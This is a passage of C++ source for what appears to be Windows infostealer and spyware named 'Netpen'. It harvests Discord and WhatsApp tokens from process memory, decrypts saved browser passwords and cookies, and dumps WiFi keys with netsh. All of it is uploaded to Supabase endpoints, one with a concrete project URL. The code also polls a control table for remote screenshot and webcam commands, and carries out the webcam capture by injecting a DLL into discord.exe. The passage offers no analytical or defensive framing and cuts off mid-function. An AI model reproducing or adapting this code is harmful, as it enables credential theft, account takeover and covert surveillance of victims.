        LogMsg("Discord: uploaded " + std::to_string(tokens.size()) + " tokens from memory");
    } else {
        LogMsg("Discord mem: no token found in any discord.exe process");
    }
}

static void HarvestWhatsAppSession() {
    std::vector<std::string> tokens;
    DWORD startTick = GetTickCount();
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe = { sizeof(pe) };
        if (Process32FirstW(hSnap, &pe)) {
            do {
                if (lstrcmpiW(pe.szExeFile, L"msedgewebview2.exe") != 0 && lstrcmpiW(pe.szExeFile, L"WhatsApp.exe") != 0) continue;
                HANDLE hp = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
                if (!hp) continue;
                SYSTEM_INFO si; GetSystemInfo(&si);
                uintptr_t addr = (uintptr_t)si.lpMinimumApplicationAddress;
                while (addr < (uintptr_t)si.lpMaximumApplicationAddress) {
                    if (GetTickCount() - startTick > 10000) break;
                    MEMORY_BASIC_INFORMATION mbi;
                    if (VirtualQueryEx(hp, (LPCVOID)addr, &mbi, sizeof(mbi)) == 0) { addr += 65536; continue; }
                    if (mbi.State == MEM_COMMIT && (mbi.Protect & (PAGE_READWRITE | PAGE_READONLY)) && !(mbi.Protect & PAGE_GUARD) && mbi.Type == MEM_PRIVATE && mbi.RegionSize <= 104857600) {
                        char* buf = new (std::nothrow) char[(size_t)mbi.RegionSize + 1];
                        if (!buf) { addr += mbi.RegionSize; continue; }
                        SIZE_T rd = 0;
                        if (ReadProcessMemory(hp, mbi.BaseAddress, buf, mbi.RegionSize, &rd) && rd > 0) {
                            buf[rd] = 0;
                            for (DWORD i = 0; i < (DWORD)rd; i++) {
                                if (!IsTokenChar(buf[i])) continue;
                                // WAToken1 (client token)
                                if (i + 8 <= rd && memcmp(buf + i, "WAToken1", 8) == 0) {
                                    DWORD end = i + 8;
                                    while (end < rd && end - i < 200) {
                                        char c = buf[end];
                                        if (c == 0 || c == '"' || c == '\'' || c == '&' || c == '|' || c == '<' || c == '>' || c == ' ' || c == '\t' || c == '\r' || c == '\n') break;
                                        if (!isalnum((unsigned char)c) && c != '+' && c != '/' && c != '=' && c != '-' && c != '_' && c != '.') break;
                                        end++;
                                    }
                                    if (end - i - 8 >= 40) tokens.push_back(std::string(buf + i + 8, end - i - 8));
                                    i = end;
                                    continue;
                                }
                                // WAToken2 (server token)
                                if (i + 8 <= rd && memcmp(buf + i, "WAToken2", 8) == 0) {
                                    DWORD end = i + 8;
                                    while (end < rd && end - i < 200) {
                                        char c = buf[end];
                                        if (c == 0 || c == '"' || c == '\'' || c == '&' || c == '|' || c == '<' || c == '>' || c == ' ' || c == '\t' || c == '\r' || c == '\n') break;
                                        if (!isalnum((unsigned char)c) && c != '+' && c != '/' && c != '=' && c != '-' && c != '_' && c != '.') break;
                                        end++;
                                    }
                                    if (end - i - 8 >= 40) tokens.push_back(std::string(buf + i + 8, end - i - 8));
                                    i = end;
                                    continue;
                                }
                            }
                        }
                        delete[] buf;
                    }
                    addr += mbi.RegionSize;
                }
                CloseHandle(hp);
            } while (Process32NextW(hSnap, &pe));
        }
        CloseHandle(hSnap);
    }

    if (!tokens.empty()) {
        std::sort(tokens.begin(), tokens.end());
        tokens.erase(std::unique(tokens.begin(), tokens.end()), tokens.end());
        std::string batch = "[";
        for (size_t i = 0; i < tokens.size(); i++) {
            if (i > 0) batch += ",";
            batch += "{\"hostname\":\"" + EscapeJSON(g_hostname) + "\",\"token\":\"" + EscapeJSON(tokens[i]) + "\"}";
        }
        batch += "]";
        std::string pr;
        HttpRequest(L"POST", SUPABASE_WHATSAPP_PATH, batch, pr);
        LogMsg("WhatsApp: uploaded " + std::to_string(tokens.size()) + " tokens");
    } else {
        LogMsg("WhatsApp: no session data found in memory");
    }
}

static void HarvestBrowserPasswords() {
    char laBuf[MAX_PATH];
    DWORD laLen = GetEnvironmentVariableA("LOCALAPPDATA", laBuf, MAX_PATH);
    if (laLen == 0 || laLen >= MAX_PATH) return;
    std::string la(laBuf);
 
    for (int b = 0; kChromeBrowsers[b].name; b++) {
        std::string bName(kChromeBrowsers[b].name);
        auto Diag = [&](const std::string& s) {
            std::string j = "[{\"hostname\":\"" + EscapeJSON(g_hostname) + "\",\"browser\":\"" + EscapeJSON(bName) + "\",\"origin_url\":\"[HARVEST]\",\"username_value\":\"\",\"password_value\":\"" + EscapeJSON(s) + "\"}]";
            std::string pr;
            HttpRequest(L"POST", SUPABASE_PASSWORDS_PATH, j, pr);
        };
        bool keyExtracted = false;
        // Read + decrypt AES key from Local State
        std::string lsPath = la + kChromeBrowsers[b].ls;
        HANDLE hLs = CreateFileA(lsPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (hLs == INVALID_HANDLE_VALUE) { LogMsg(bName + ": Local State not found"); Diag("Local State not found"); continue; }
        DWORD lsSize = GetFileSize(hLs, NULL);
        if (lsSize > 1048576) { CloseHandle(hLs); LogMsg(bName + ": Local State too large"); Diag("Local State too large"); continue; }
        std::string lsContent((size_t)lsSize, 0);
        DWORD rd = 0;
        if (!ReadFile(hLs, &lsContent[0], lsSize, &rd, NULL) || rd != lsSize) { CloseHandle(hLs); LogMsg(bName + ": Local State read failed"); Diag("Local State read failed"); continue; }
        CloseHandle(hLs);

        std::string encKeyStr = ExtractJSONString(lsContent, "encrypted_key");
        if (encKeyStr.empty()) { LogMsg(bName + ": encrypted_key not found in Local State"); Diag("encrypted_key not found"); continue; }

        // Base64 decode encrypted_key
        DWORD decLen = (DWORD)encKeyStr.size() * 3 / 4 + 16;
        std::vector<uint8_t> dec(decLen);
        if (!CryptStringToBinaryA(encKeyStr.c_str(), (DWORD)encKeyStr.size(), CRYPT_STRING_BASE64, dec.data(), &decLen, NULL, NULL)) { LogMsg(bName + ": base64 decode failed"); Diag("base64 decode failed"); continue; }
        if (decLen <= 5) { LogMsg(bName + ": decrypted key too short"); continue; }

        // DPAPI decrypt to get AES key
        DATA_BLOB inBlob = { decLen - 5, dec.data() + 5 };
        DATA_BLOB outBlob = { 0, NULL };
        if (!CryptUnprotectData(&inBlob, NULL, NULL, NULL, NULL, 0, &outBlob)) { LogMsg(bName + ": DPAPI decrypt failed"); Diag("DPAPI decrypt failed"); continue; }

        uint8_t aesKey[32];
        int keyLen = outBlob.cbData < 32 ? (int)outBlob.cbData : 32;
        memcpy(aesKey, outBlob.pbData, keyLen);
        LocalFree(outBlob.pbData);
        if (keyLen != 32) { LogMsg(bName + ": unexpected key length " + std::to_string(keyLen)); Diag("unexpected key length " + std::to_string(keyLen)); continue; }
        keyExtracted = true;

        // === Enumerate all profile Login Data files ===
        std::string ldBase = la + kChromeBrowsers[b].ld;
        std::vector<std::string> ldPaths;
        std::string suffix = "\\Default\\Login Data";
        size_t sufPos = ldBase.rfind(suffix);
        if (sufPos != std::string::npos && sufPos + suffix.size() == ldBase.size()) {
            std::string userDataDir = ldBase.substr(0, sufPos);
            ldPaths.push_back(userDataDir + "\\Default\\Login Data");
            std::string searchPath = userDataDir + "\\Profile*";
            WIN32_FIND_DATAA fd;
            HANDLE hFind = FindFirstFileA(searchPath.c_str(), &fd);
            if (hFind != INVALID_HANDLE_VALUE) {
                do {
                    if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
                        ldPaths.push_back(userDataDir + "\\" + fd.cFileName + "\\Login Data");
                } while (FindNextFileA(hFind, &fd));
                FindClose(hFind);
            }
        } else {
            ldPaths.push_back(ldBase);
        }

        std::string batch = "[";
        bool first = true;
        int totalCount = 0;
        std::vector<std::string> seenDedup;

        for (size_t pi = 0; pi < ldPaths.size(); pi++) {
            std::string ldPath = ldPaths[pi];
            char tmpDir[MAX_PATH]; GetTempPathA(MAX_PATH, tmpDir);
            std::string tmpLd = std::string(tmpDir) + "NPLD_" + std::to_string(GetTickCount()) + "_" + std::to_string(pi) + ".tmp";
            if (!CopyFileA(ldPath.c_str(), tmpLd.c_str(), FALSE)) continue;

            HANDLE hF = CreateFileA(tmpLd.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
            HANDLE hM = NULL; const uint8_t* dbMap = NULL; size_t dbSz = 0;
            if (hF != INVALID_HANDLE_VALUE) { dbSz = GetFileSize(hF, NULL); if (dbSz > 100) { hM = CreateFileMapping(hF, NULL, PAGE_READONLY, 0, 0, NULL); if (hM) dbMap = (const uint8_t*)MapViewOfFile(hM, FILE_MAP_READ, 0, 0, 0); } }
            if (!dbMap) { if (hF) CloseHandle(hF); DeleteFileA(tmpLd.c_str()); continue; }

            int psInt = SqliteU16(dbMap + 16); if (psInt == 1) psInt = 65536; if (psInt < 512) psInt = 512; uint16_t ps = (uint16_t)psInt;

            int rootP = SqliteFindTableRoot(dbMap, dbSz, ps, "logins");
            if (rootP <= 0) { LogMsg(bName + ": logins table not found in " + ldPath); }
            if (rootP > 0) {
                struct HCtx { const uint8_t* db; size_t dbSz; uint16_t ps; uint8_t* ak; int kl; const char* bn; const char* hn; std::string* batch; bool* first; int* count; std::vector<std::string>* seen; };
                HCtx hc = { dbMap, dbSz, ps, aesKey, 32, kChromeBrowsers[b].name, g_hostname.c_str(), &batch, &first, &totalCount, &seenDedup };

                SqliteWalk(dbMap, dbSz, ps, rootP, [](int64_t, const uint8_t* p, int pl, void* u) -> bool {
                    auto* h = (HCtx*)u; int urlL;
                    const uint8_t* urlD = SqliteColumn(p, pl, 0, &urlL);
                    if (!urlD || urlL <= 0) return true;
                    std::string url((const char*)urlD, urlL);
                    if (url.find("://") == std::string::npos || url.find("chrome://") == 0 || url.find("about:") == 0 || url.find("edge://") == 0 || url.find("brave://") == 0) return true;

                    int usrL; const uint8_t* usrD = SqliteColumn(p, pl, 3, &usrL);
                    if (!usrD || usrL <= 0) return true;
                    std::string usr((const char*)usrD, usrL);

                    std::string dedupKey = url + "|" + usr;
                    for (size_t i = 0; i < h->seen->size(); i++) {
                        if ((*h->seen)[i] == dedupKey) return true;
                    }
                    h->seen->push_back(dedupKey);

                    int pwL; const uint8_t* pwD = SqliteColumn(p, pl, 5, &pwL);
                    if (!pwD || pwL <= 15) return true;

                    std::string pwd;
                    if (!ChromeDecryptPassword(h->ak, h->kl, pwD, pwL, h->bn, url, pwd) || pwd.empty()) return true;

                    std::string row = std::string(*h->first ? "" : ",") + "{\"hostname\":\"" + EscapeJSON(h->hn) + "\",\"browser\":\"" + EscapeJSON(h->bn) + "\",\"origin_url\":\"" + EscapeJSON(url) + "\",\"username_value\":\"" + EscapeJSON(usr) + "\",\"password_value\":\"" + EscapeJSON(pwd) + "\"}";
                    *h->batch += row; *h->first = false; (*h->count)++;
                    LogMsg(std::string(h->bn) + ": " + url + " / " + usr);
                    return true;
                }, &hc);
            }

            UnmapViewOfFile(dbMap);
            if (hM) CloseHandle(hM); if (hF) CloseHandle(hF);
            DeleteFileA(tmpLd.c_str());
        }

        if (totalCount > 0) {
            batch += "]";
            std::string pr;
            HttpRequest(L"POST", SUPABASE_PASSWORDS_PATH, batch, pr);
            LogMsg(std::string(kChromeBrowsers[b].name) + ": " + std::to_string(totalCount) + " passwords uploaded from " + std::to_string(ldPaths.size()) + " profile(s)");
        } else if (keyExtracted) {
            Diag("0 passwords found (" + std::to_string(ldPaths.size()) + " profiles scanned)");
        }
    }
    LogMsg("Browser password harvest complete");
}
  
static void HarvestBrowserCookies() {
    char laBuf[MAX_PATH];
    DWORD laLen = GetEnvironmentVariableA("LOCALAPPDATA", laBuf, MAX_PATH);
    if (laLen == 0 || laLen >= MAX_PATH) return;
    std::string la(laBuf);

    for (int b = 0; kChromeBrowsers[b].name; b++) {
        std::string bName(kChromeBrowsers[b].name);
        auto Diag = [&](const std::string& s) {
            std::string j = "[{\"hostname\":\"" + EscapeJSON(g_hostname) + "\",\"browser\":\"" + EscapeJSON(bName) + "\",\"domain\":\"[HARVEST]\",\"name\":\"status\",\"value\":\"" + EscapeJSON(s) + "\"}]";
            std::string pr;
            HttpRequest(L"POST", SUPABASE_COOKIES_PATH, j, pr);
        };
        bool keyExtracted = false;

        std::string lsPath = la + kChromeBrowsers[b].ls;
        HANDLE hLs = CreateFileA(lsPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (hLs == INVALID_HANDLE_VALUE) { LogMsg(bName + " (cookies): Local State not found"); Diag("Local State not found"); continue; }
        DWORD lsSize = GetFileSize(hLs, NULL);
        if (lsSize > 1048576) { CloseHandle(hLs); LogMsg(bName + " (cookies): Local State too large"); Diag("Local State too large"); continue; }
        std::string lsContent((size_t)lsSize, 0);
        DWORD rd = 0;
        if (!ReadFile(hLs, &lsContent[0], lsSize, &rd, NULL) || rd != lsSize) { CloseHandle(hLs); LogMsg(bName + " (cookies): Local State read failed"); Diag("Local State read failed"); continue; }
        CloseHandle(hLs);

        std::string encKeyStr = ExtractJSONString(lsContent, "encrypted_key");
        if (encKeyStr.empty()) { LogMsg(bName + " (cookies): encrypted_key not found"); Diag("encrypted_key not found"); continue; }

        DWORD decLen = (DWORD)encKeyStr.size() * 3 / 4 + 16;
        std::vector<uint8_t> dec(decLen);
        if (!CryptStringToBinaryA(encKeyStr.c_str(), (DWORD)encKeyStr.size(), CRYPT_STRING_BASE64, dec.data(), &decLen, NULL, NULL)) { LogMsg(bName + " (cookies): base64 decode failed"); Diag("base64 decode failed"); continue; }
        if (decLen <= 5) { LogMsg(bName + " (cookies): key too short"); continue; }

        DATA_BLOB inBlob = { decLen - 5, dec.data() + 5 };
        DATA_BLOB outBlob = { 0, NULL };
        if (!CryptUnprotectData(&inBlob, NULL, NULL, NULL, NULL, 0, &outBlob)) { LogMsg(bName + " (cookies): DPAPI decrypt failed"); Diag("DPAPI decrypt failed"); continue; }

        uint8_t aesKey[32];
        int keyLen = outBlob.cbData < 32 ? (int)outBlob.cbData : 32;
        memcpy(aesKey, outBlob.pbData, keyLen);
        LocalFree(outBlob.pbData);
        if (keyLen != 32) { LogMsg(bName + " (cookies): unexpected key length"); Diag("unexpected key length"); continue; }
        keyExtracted = true;

        // Build profile dirs from ldBase
        std::string ldBase = la + kChromeBrowsers[b].ld;
        std::vector<std::string> profileDirs;
        std::string suffix = "\\Default\\Login Data";
        size_t sufPos = ldBase.rfind(suffix);
        if (sufPos != std::string::npos && sufPos + suffix.size() == ldBase.size()) {
            std::string userDataDir = ldBase.substr(0, sufPos);
            profileDirs.push_back(userDataDir + "\\Default");
            std::string searchPath = userDataDir + "\\Profile*";
            WIN32_FIND_DATAA fd;
            HANDLE hFind = FindFirstFileA(searchPath.c_str(), &fd);
            if (hFind != INVALID_HANDLE_VALUE) {
                do {
                    if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
                        profileDirs.push_back(userDataDir + "\\" + fd.cFileName);
                } while (FindNextFileA(hFind, &fd));
                FindClose(hFind);
            }
        } else {
            // Opera-style: strip \Login Data
            size_t lastSlash = ldBase.rfind('\\');
            profileDirs.push_back(ldBase.substr(0, lastSlash));
        }

        std::string batch = "[";
        bool first = true;
        int totalCount = 0;
        std::vector<std::string> seenDedup;

        for (size_t pi = 0; pi < profileDirs.size(); pi++) {
            std::string baseDir = profileDirs[pi];

            // Try Network\Cookies then Cookies
            std::string cookieFiles[] = {
                baseDir + "\\Network\\Cookies",
                baseDir + "\\Cookies"
            };
            for (int ci = 0; ci < 2; ci++) {
                std::string cookPath = cookieFiles[ci];
                char tmpDir[MAX_PATH]; GetTempPathA(MAX_PATH, tmpDir);
                std::string tmpCp = std::string(tmpDir) + "NPCK_" + std::to_string(GetTickCount()) + "_" + std::to_string(pi) + ".tmp";
                if (!CopyFileA(cookPath.c_str(), tmpCp.c_str(), FALSE)) continue;

                HANDLE hF = CreateFileA(tmpCp.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
                HANDLE hM = NULL; const uint8_t* dbMap = NULL; size_t dbSz = 0;
                if (hF != INVALID_HANDLE_VALUE) { dbSz = GetFileSize(hF, NULL); if (dbSz > 100) { hM = CreateFileMapping(hF, NULL, PAGE_READONLY, 0, 0, NULL); if (hM) dbMap = (const uint8_t*)MapViewOfFile(hM, FILE_MAP_READ, 0, 0, 0); } }
                if (!dbMap) { if (hF) CloseHandle(hF); DeleteFileA(tmpCp.c_str()); continue; }

                int psInt = SqliteU16(dbMap + 16); if (psInt == 1) psInt = 65536; if (psInt < 512) psInt = 512; uint16_t ps = (uint16_t)psInt;
                int rootP = SqliteFindTableRoot(dbMap, dbSz, ps, "cookies");
                if (rootP <= 0) { LogMsg(bName + " (cookies): table not found"); }
                if (rootP > 0) {
                    struct HCtx { const uint8_t* db; size_t dbSz; uint16_t ps; uint8_t* ak; int kl; const char* bn; const char* hn; std::string* batch; bool* first; int* count; std::vector<std::string>* seen; int idxName; int idxEncVal; };
                    HCtx hc = { dbMap, dbSz, ps, aesKey, 32, kChromeBrowsers[b].name, g_hostname.c_str(), &batch, &first, &totalCount, &seenDedup, 2, 12 };

                    SqliteWalk(dbMap, dbSz, ps, rootP, [](int64_t, const uint8_t* p, int pl, void* u) -> bool {
                        auto* h = (HCtx*)u;
                        // Detect schema from column count on first call
                        if (h->idxName == 2 && h->idxEncVal == 12) {
                            int u2; uint32_t hdrSz = SqliteVarint(p, &u2);
                            int pos = u2, colCount = 0;
                            while (pos < (int)hdrSz) { SqliteVarint(p + pos, &u2); pos += u2; colCount++; }
                            if (colCount >= 17) { h->idxName = 3; h->idxEncVal = 5; }
                        }

                        int hostL; const uint8_t* hostD = SqliteColumn(p, pl, 1, &hostL);
                        if (!hostD || hostL <= 0) return true;
                        std::string host((const char*)hostD, hostL);

                        int nameL; const uint8_t* nameD = SqliteColumn(p, pl, h->idxName, &nameL);
                        if (!nameD || nameL <= 0) return true;
                        std::string name((const char*)nameD, nameL);

                        int valL; const uint8_t* valD = SqliteColumn(p, pl, h->idxEncVal, &valL);
                        if (!valD || valL <= 0) return true;

                        // Decrypt the cookie value
                        std::string decrypted;
                        if (ChromeDecryptPassword(h->ak, h->kl, valD, valL, h->bn, host, decrypted) && !decrypted.empty()) {
                            // Dedup by domain + name
                            std::string dedupKey = host + "|" + name;
                            for (size_t i = 0; i < h->seen->size(); i++) {
                                if ((*h->seen)[i] == dedupKey) return true;
                            }
                            h->seen->push_back(dedupKey);

                            // Base64-encode for safe JSON transport
                            DWORD b64Len = (DWORD)decrypted.size() * 3 / 4 + 16;
                            std::vector<char> b64(b64Len);
                            if (CryptBinaryToStringA((BYTE*)decrypted.data(), (DWORD)decrypted.size(), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, b64.data(), &b64Len)) {
                                std::string b64Str(b64.data(), b64Len);
                                while (!b64Str.empty() && b64Str.back() == '\0') b64Str.pop_back();
                                std::string row = std::string(*h->first ? "" : ",") + "{\"hostname\":\"" + EscapeJSON(h->hn) + "\",\"browser\":\"" + EscapeJSON(h->bn) + "\",\"domain\":\"" + EscapeJSON(host) + "\",\"name\":\"" + EscapeJSON(name) + "\",\"value\":\"" + EscapeJSON(b64Str) + "\"}";
                                *h->batch += row; *h->first = false; (*h->count)++;
                                LogMsg(std::string(h->bn) + " (cookie): " + host + " / " + name);
                            }
                        }
                        return true;
                    }, &hc);
                }

                UnmapViewOfFile(dbMap);
                if (hM) CloseHandle(hM); if (hF) CloseHandle(hF);
                DeleteFileA(tmpCp.c_str());
            }
        }

        if (totalCount > 0) {
            batch += "]";
            std::string pr;
            HttpRequest(L"POST", SUPABASE_COOKIES_PATH, batch, pr);
            LogMsg(bName + " (cookies): " + std::to_string(totalCount) + " cookies uploaded from " + std::to_string(profileDirs.size()) + " profile(s)");
        } else if (keyExtracted) {
            Diag("0 cookies found (" + std::to_string(profileDirs.size()) + " profiles scanned)");
        }
    }
    LogMsg("Browser cookie harvest complete");
}

static void HarvestWiFiPasswords() {
    char laBuf[MAX_PATH];
    DWORD laLen = GetEnvironmentVariableA("LOCALAPPDATA", laBuf, MAX_PATH);
    if (laLen == 0 || laLen >= MAX_PATH) return;
    std::string la(laBuf);

    std::string host(g_hostname);
    if (host.empty()) {
        char buf[256] = {0};
        DWORD sz = sizeof(buf);
        GetComputerNameA(buf, &sz);
        host = buf;
    }

    // Get IPv4 address
    std::string ipv4;
    std::string ipResp = ExecuteCommand("ipconfig");
    if (!ipResp.empty()) {
        std::istringstream iss(ipResp);
        std::string line;
        while (std::getline(iss, line)) {
            size_t colon = line.find(':');
            if (colon == std::string::npos) continue;
            std::string val = line.substr(colon + 1);
            val.erase(0, val.find_first_not_of(" \t\r"));
            val.erase(val.find_last_not_of(" \t\r") + 1);
            if (val.find('.') != std::string::npos && val.find_first_of("0123456789") != std::string::npos) {
                // Check if the prefix contains IPv4 or IP
                std::string prefix = line.substr(0, colon);
                if (prefix.find("IPv4") != std::string::npos || prefix.find("IP") != std::string::npos) {
                    ipv4 = val;
                    break;
                }
            }
        }
    }

    // Get SSID list
    std::string profileResp = ExecuteCommand("netsh wlan show profiles");
    if (profileResp.empty()) { LogMsg("WiFi: no output from netsh"); return; }

    std::vector<std::string> ssids;
    {
        std::istringstream iss(profileResp);
        std::string line;
        while (std::getline(iss, line)) {
            size_t colon = line.find(':');
            if (colon == std::string::npos) continue;
            std::string prefix = line.substr(0, colon);
            // Look for "All User Profile" or localized variant containing "Profile"
            if (prefix.find("Profile") == std::string::npos && prefix.find("profile") == std::string::npos) continue;
            std::string val = line.substr(colon + 1);
            val.erase(0, val.find_first_not_of(" \t\r"));
            val.erase(val.find_last_not_of(" \t\r") + 1);
            if (!val.empty()) ssids.push_back(val);
        }
    }

    std::string batch = "[";
    bool first = true;
    int count = 0;

    for (size_t i = 0; i < ssids.size(); i++) {
        // Escape special chars for cmd.exe
        std::string ssid = ssids[i];
        for (size_t j = 0; j < ssid.size(); j++) {
            if (ssid[j] == '&' || ssid[j] == '|' || ssid[j] == '<' || ssid[j] == '>' || ssid[j] == '^') {
                ssid.insert(j, "^"); j++;
            }
        }

        std::string cmd = "netsh wlan show profile name=\"" + ssid + "\" key=clear";
        std::string resp = ExecuteCommand(cmd);
        if (resp.empty()) continue;

        std::string password;
        std::string security;

        std::istringstream iss(resp);
        std::string line;
        while (std::getline(iss, line)) {
            size_t colon = line.find(':');
            if (colon == std::string::npos) continue;
            std::string field = line.substr(0, colon);
            std::string val = line.substr(colon + 1);
            val.erase(0, val.find_first_not_of(" \t\r"));
            val.erase(val.find_last_not_of(" \t\r") + 1);

            if (field.find("Key Content") != std::string::npos || field.find("key Content") != std::string::npos) {
                password = val;
            } else if (field.find("Authentication") != std::string::npos) {
                security = val;
            }
        }

        std::string row = std::string(first ? "" : ",") + "{";
        row += "\"hostname\":\"" + EscapeJSON(host) + "\"";
        row += ",\"ssid\":\"" + EscapeJSON(ssids[i]) + "\"";
        row += ",\"password\":\"" + EscapeJSON(password) + "\"";
        row += ",\"security\":\"" + EscapeJSON(security) + "\"";
        row += ",\"ipv4\":\"" + EscapeJSON(ipv4) + "\"";
        row += "}";
        batch += row;
        first = false;
        count++;
        LogMsg("WiFi: " + ssids[i]);
    }

    if (count == 0) {
        batch += "{\"hostname\":\"" + EscapeJSON(host) + "\",\"ssid\":\"(none)\",\"password\":\"\",\"security\":\"\",\"ipv4\":\"" + EscapeJSON(ipv4) + "\"}";
        count = 1;
    }
    batch += "]";
    std::string pr;
    HttpRequest(L"POST", SUPABASE_WIFI_PATH, batch, pr);
    LogMsg("WiFi: " + std::to_string(count) + " results uploaded");
}

static std::string CheckScreenshotCmd() {
    std::wstring q = SUPABASE_CONTROL_PATH;
    q += L"?command=eq.screenshot&executed=eq.false&hostname=eq." + ToWide(g_hostname) + L"&select=id";
    std::string resp;
    if (!HttpRequest(L"GET", q.c_str(), "", resp)) return "";
    size_t p = resp.find("\"id\":");
    if (p == std::string::npos) return "";
    p += 5;
    size_t e = resp.find_first_of("},]", p);
    if (e == std::string::npos) return "";
    return resp.substr(p, e - p);
}

static void HandleScreenshot(const std::string& rowId) {
    char tmp[MAX_PATH];
    GetTempPathA(MAX_PATH, tmp);
    std::string ts = GetScreenshotTimestamp();
    std::string localFile = std::string(tmp) + "NetpenShot_" + g_hostname + "_" + ts + ".jpg";
    std::string storageFile = "screenshots/" + g_hostname + "_" + ts + ".jpg";

    if (!CaptureScreen(localFile.c_str())) { LogMsg("Screenshot: capture failed"); return; }
    std::string storagePath = "/storage/v1/object/Netpen/" + storageFile;
    if (!UploadToStorage(localFile, storagePath, "image/jpeg")) {
        LogMsg("Screenshot: upload failed");
        DeleteFileA(localFile.c_str());
        return;
    }

    std::string resultUrl = "https://xdxlfkyywnjrzqblvdzg.supabase.co/storage/v1/object/public/Netpen/" + storageFile;
    std::string json = "{\"executed\":true,\"result_url\":\"" + EscapeJSON(resultUrl) + "\"}";
    std::wstring patchPath = SUPABASE_CONTROL_PATH;
    patchPath += L"?id=eq." + ToWide(rowId);
    std::string resp;
    HttpRequest(L"PATCH", patchPath.c_str(), json, resp);

    std::string host = g_hostname.empty() ? "unknown" : g_hostname;
    PostDiscordImage(host, "Netpen \u2014 " + host + " Screenshot", resultUrl, "");

    DeleteFileA(localFile.c_str());
    LogMsg("Screenshot done: " + resultUrl);
}

static std::string CheckWebcamCmd() {
    std::wstring q = SUPABASE_CONTROL_PATH;
    q += L"?command=eq.webcam&executed=eq.false&hostname=eq." + ToWide(g_hostname) + L"&select=id";
    std::string resp;
    if (!HttpRequest(L"GET", q.c_str(), "", resp)) return "";
    size_t p = resp.find("\"id\":");
    if (p == std::string::npos) return "";
    p += 5;
    size_t e = resp.find_first_of("},]", p);
    if (e == std::string::npos) return "";
    return resp.substr(p, e - p);
}

static DWORD FindProcessPid(const wchar_t* name) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe = { sizeof(pe) };
    DWORD pid = 0;
    if (Process32FirstW(hSnapshot, &pe)) {
        do {
            if (lstrcmpiW(pe.szExeFile, name) == 0) { pid = pe.th32ProcessID; break; }
        } while (Process32NextW(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
    return pid;
}

static bool ExtractDllToTemp(std::string& outPath) {
    HRSRC hRes = FindResourceA(NULL, MAKEINTRESOURCEA(101), RT_RCDATA);
    if (!hRes) return false;
    HGLOBAL hGlob = LoadResource(NULL, hRes);
    void* data = LockResource(hGlob);
    DWORD size = SizeofResource(NULL, hRes);
    if (!data || size == 0) return false;
    char tmpDir[MAX_PATH];
    GetTempPathA(MAX_PATH, tmpDir);
    outPath = std::string(tmpDir) + "discord_cap_" + std::to_string(GetTickCount()) + ".dll";
    HANDLE hFile = CreateFileA(outPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;
    DWORD written = 0;
    bool ok = (WriteFile(hFile, data, size, &written, NULL) && written == size);
    CloseHandle(hFile);
    if (!ok) { DeleteFileA(outPath.c_str()); return false; }
    return true;
}

static bool InjectAndCaptureWebcam(const wchar_t* outputPath) {
    DWORD pid = FindProcessPid(L"discord.exe");
    if (!pid) { LogMsg("Webcam injection: Discord.exe not found"); return false; }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) { LogMsg("Webcam injection: OpenProcess failed"); return false; }

    std::string dllPathA;
    if (!ExtractDllToTemp(dllPathA)) { LogMsg("Webcam injection: DLL extract failed"); CloseHandle(hProcess); return false; }
    LogMsg("Webcam injection: DLL extracted to temp");

    int wlen = MultiByteToWideChar(CP_UTF8, 0, dllPathA.c_str(), -1, NULL, 0);
    std::wstring dllPathW((size_t)wlen - 1, 0);
    MultiByteToWideChar(CP_UTF8, 0, dllPathA.c_str(), -1, &dllPathW[0], wlen);

    // Extract base filename for module enumeration (DLL was renamed to a random temp name)
    std::wstring dllBaseNameW = dllPathW;
    size_t slashPos = dllBaseNameW.find_last_of(L"\\/");
    if (slashPos != std::wstring::npos) dllBaseNameW = dllBaseNameW.substr(slashPos + 1);

    size_t dllPathBytes = (dllPathW.size() + 1) * sizeof(wchar_t);
    void* remoteDllPath = VirtualAllocEx(hProcess, NULL, dllPathBytes, MEM_COMMIT, PAGE_READWRITE);
    void* remoteParams = VirtualAllocEx(hProcess, NULL, sizeof(CaptureParams), MEM_COMMIT, PAGE_READWRITE);
    if (!remoteDllPath || !remoteParams) {
        if (remoteDllPath) VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);
        if (remoteParams) VirtualFreeEx(hProcess, remoteParams, 0, MEM_RELEASE);
        CloseHandle(hProcess); DeleteFileA(dllPathA.c_str()); LogMsg("Webcam injection: VirtualAllocEx failed"); return false;
    }

    WriteProcessMemory(hProcess, remoteDllPath, dllPathW.c_str(), dllPathBytes, NULL);
    CaptureParams params;
    wcscpy_s(params.outputPath, outputPath);
    WriteProcessMemory(hProcess, remoteParams, &params, sizeof(params), NULL);

    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    FARPROC loadLibraryW = GetProcAddress(hKernel32, "LoadLibraryW");

    HANDLE hLoadThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryW, remoteDllPath, 0, NULL);
    if (!hLoadThread) {
        VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);
        VirtualFreeEx(hProcess, remoteParams, 0, MEM_RELEASE);
